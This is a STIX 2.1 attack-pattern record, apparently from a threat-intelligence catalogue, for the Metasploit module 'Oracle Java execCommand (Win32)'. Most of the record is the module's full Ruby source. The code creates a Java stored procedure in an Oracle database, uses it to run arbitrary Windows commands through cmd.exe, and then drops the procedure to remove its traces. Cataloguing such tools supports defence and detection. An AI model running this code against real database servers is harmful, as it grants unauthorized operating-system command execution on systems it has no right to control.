{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4aa0ed03-c26d-4dbb-9452-2a35b8c05995",
    "created": "2024-08-14T16:22:56.173472Z",
    "modified": "2024-08-14T16:22:56.173475Z",
    "name": "Oracle Java execCommand (Win32)",
    "description": " This module will create a java class which enables the execution of OS commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/post_exploitation/win32exec.rb",
            "external_id": "win32exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.metasploit.com/users/mc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Java execCommand (Win32)',\n      'Description'    => %q{\n          This module will create a java class which enables the execution of OS commands.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.metasploit.com/users/mc' ],\n        ],\n      'DisclosureDate' => '2007-12-07'))\n\n      register_options(\n        [\n          OptString.new('CMD', [ false, 'The OS command to execute.',  'echo metasploit > %SYSTEMDRIVE%\\\\\\\\unbreakable.txt']),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    source = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    name   = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    java = \"\n      create or replace and resolve java source named \\\"#{source}\\\" as\n      import java.lang.*;\n      import java.io.*;\n      public class #{source}\n      {\n      public static void execCommand (String command) throws IOException\n      {\n      Runtime.getRuntime().exec(command);\n      }\n      };\n      \"\n\n    procedure = \"\n      create or replace procedure #{name} (p_command in varchar2)\n      as language java\n      name '#{source}.execCommand (java.lang.String)';\n      \"\n\n    exec      = \"begin #{name}('cmd.exe /c #{datastore['CMD']}'); end;\"\n\n    drops     = \"drop java source #{source}\"\n\n    dropp     = \"drop procedure #{name}\"\n\n    begin\n      print_status(\"Creating java source '#{source}'...\")\n      prepare_exec(java)\n    rescue => e\n      return\n    end\n\n    print_status(\"Creating procedure '#{name}'...\")\n    prepare_exec(procedure)\n\n    print_status(\"Sending command: '#{datastore['CMD']}'\")\n    prepare_exec(exec)\n\n    print_status(\"Removing java source '#{source}'...\")\n    prepare_exec(drops)\n\n    print_status(\"Removing procedure '#{name}'...\")\n    prepare_exec(dropp)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-07"
}